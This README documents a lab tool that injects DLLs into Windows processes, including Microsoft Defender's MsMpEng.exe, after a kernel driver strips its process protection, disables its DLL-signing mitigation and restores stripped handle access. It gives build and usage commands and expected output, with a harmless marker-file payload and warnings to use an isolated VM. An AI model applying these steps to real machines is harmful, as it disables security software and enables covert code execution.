# dll_injector — DLL injection with MakeMePPL support

This folder integrates the `dll_load` lab injector into the MakeMePPL repository.
It is a classic remote `LoadLibrary` injector, extended with driver-backed
options so it can inject into protected processes such as
**`MsMpEng.exe`** (Microsoft Defender).

The injector uses the shared MakeMePPL ABI directly
([`../shared/PplIoctl.h`](../shared/PplIoctl.h)) and the existing usermode
client ([`../usermode/PplDriverClient.cpp`](../usermode/PplDriverClient.cpp)).
It does not duplicate the IOCTL structs.

| Component | Source | Output |
|---|---|---|
| Injector | `DllInjector.cpp` | `bin\<Configuration>\injector.exe` |
| Test payload | `payload\payload.c` | `bin\<Configuration>\payload.dll` |

`payload.dll` writes a marker file to `C:\data\dll_load_<pid>.txt` from
`DLL_PROCESS_ATTACH`, so it proves code ran inside the target process.

> **Isolated test VM only.** `--ppl` removes PPL from a running process and
> clears a code-integrity mitigation. Injecting into Defender is invasive and
> can destabilise the VM. Take a snapshot first.

## Build

Build the whole solution (preferred):

```powershell
.\scripts\Build.ps1 -Configuration Release
```

This produces:

```text
bin\Release\injector.exe
bin\Release\payload.dll
```

The already-loaded `MakeMePPL.sys` cannot be relinked while the driver is
running. Stop the driver first, or build only the new projects (set
`SolutionDir` so they still land in the common `bin` folder):

```powershell
$root = (Get-Location).Path
$msbuild = "C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe"

& $msbuild .\dll_injector\DllInjector.vcxproj `
    /p:Configuration=Release /p:Platform=x64 "/p:SolutionDir=$root\"

& $msbuild .\dll_injector\payload\DllPayload.vcxproj `
    /p:Configuration=Release /p:Platform=x64 "/p:SolutionDir=$root\"
```

## Usage

```text
injector.exe <pid|image name> <full\path\to\payload.dll>
             [--ppl] [--fix-handle] [--kernel-thread] [--restore]
```

The first argument is either a numeric PID or an image name such as
`MsMpEng.exe` (resolved case-insensitively with Toolhelp32). The DLL path is
normalised to an absolute path before injection.

| Option | What it does | Driver IOCTL |
|---|---|---|
| `--ppl` | Removes PPL from the target and clears the block-non-Microsoft-binaries DLL mitigation before injecting. Both changes are tracked by the driver. | `IOCTL_PPL_FORCE_CLEAR_BY_PID`, `IOCTL_PPL_ALLOW_NON_MS_DLLS` |
| `--fix-handle` | Restores process access that Defender self-protection stripped from the `OpenProcess` handle. | `IOCTL_PPL_FIX_HANDLE_ACCESS` |
| `--kernel-thread` | Creates the remote thread from kernel mode, bypassing the user-mode protected-process thread-creation check. | `IOCTL_PPL_CREATE_REMOTE_THREAD` |
| `--restore` | After injection, restores the original protection and signature mitigation. Only meaningful with `--ppl`. | `IOCTL_PPL_CLEAR_BY_PID` |

`--ppl`, `--fix-handle`, `--kernel-thread` and `--restore` require the
MakeMePPL driver to be loaded. See [`../README.md`](../README.md) for driver
installation and [`../GUIDE.md`](../GUIDE.md) for the full command reference.

### Inject into MsMpEng.exe

Protection must be removed **before** `OpenProcess`, because a PPL process
refuses `PROCESS_VM_WRITE`, `PROCESS_VM_OPERATION` and
`PROCESS_CREATE_THREAD`. Run the injector **elevated**: after PPL is cleared,
the target still runs as SYSTEM and a medium-integrity token cannot open it.

```powershell
# Elevated PowerShell, driver loaded, test VM only.
.\bin\Release\injector.exe MsMpEng.exe .\bin\Release\payload.dll `
    --ppl --fix-handle --kernel-thread --restore
```

Expected flow:

```text
[*] PPL before    : 0x31 (type=ppl, signer=antimalware), ...
[+] PPL cleared    : 0x31 -> 0x00
[+] blockdll off  : ...
[+] OpenProcess ok
[+] handle access : 0x00001410 -> 0x001FFFFF
[+] VirtualAllocEx ok ...
[+] WriteProcessMemory ok
[+] LoadLibraryW @ 0x...
[+] kernel thread : tid ...
[+] payload DLL is loaded in the target
[*] restoring original protection/mitigation
[+] protection restored: 0x00 -> 0x31
```

Verify with the marker file:

```powershell
Get-Content C:\data\dll_load_<MsMpEng pid>.txt
.\bin\Release\PplCtl.exe query --pid <MsMpEng pid>
```

The `query` protection should be back to `0x31` after `--restore`.

### Inject into a normal test process

```powershell
$target = Start-Process .\bin\Release\test_target.exe -PassThru
.\bin\Release\injector.exe $target.Id .\bin\Release\payload.dll
Get-Content "C:\data\dll_load_$($target.Id).txt"
```

`--fix-handle` and `--kernel-thread` can also be exercised against a normal
target:

```powershell
.\bin\Release\injector.exe $target.Id .\bin\Release\payload.dll `
    --fix-handle --kernel-thread
```

## How the injection works

1. `--ppl` (optional): force-clear `EPROCESS!PS_PROTECTION` and clear the
   block-non-Microsoft-binaries mitigation through MakeMePPL.
2. `OpenProcess` with `PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
   PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ`.
3. `--fix-handle` (optional): rewrite the stripped `GrantedAccess` on our
   existing handle.
4. `VirtualAllocEx` + `WriteProcessMemory` for the absolute DLL path.
5. Resolve `kernel32!LoadLibraryW`.
6. `CreateRemoteThread`, or `--kernel-thread` so MakeMePPL calls
   `RtlCreateUserThread` from kernel mode.
7. Wait for the thread / poll the target's module list, then free the remote
   buffer.
8. `--restore` (optional): restore protection and mitigation, or leave the
   tracked change for `pplctl clear --pid <pid>`.

## Notes and limitations

- **Bitness must match.** The solution builds x64; a 64-bit injector cannot
  inject a 32-bit DLL into a 64-bit process.
- **Elevation.** Injecting into `MsMpEng.exe` or any process owned by another
  user requires an elevated injector. `--ppl` clears protection, but it does
  not grant an unprivileged token access to a SYSTEM process.
- **Handle repair is not access creation.** `--fix-handle` can only rewrite a
  handle `OpenProcess` already returned. It cannot turn a failed
  `OpenProcess` into a success.
- **Defender may react.** After the payload loads, Defender may re-enable its
  DLL signature mitigation. Keep `--restore` (or run
  `pplctl clear --pid <pid>`) to put PPL back.
- **A loaded payload locks its file.** Windows keeps `payload.dll` mapped in
  the target, so rebuilding `bin\Release\payload.dll` fails while that target
  is still running. Use a different payload name for repeat tests, or reboot
  / terminate the target.
- **Leaving changes tracked.** Without `--restore`, the driver keeps the
  original values so `pplctl clear --pid <pid>` or driver unload can restore
  them.
- **`C:\data` must be writable** by the target for the marker file to appear.
- This is a test tool for your own isolated VM. Do not inject into processes
  you do not own or control.
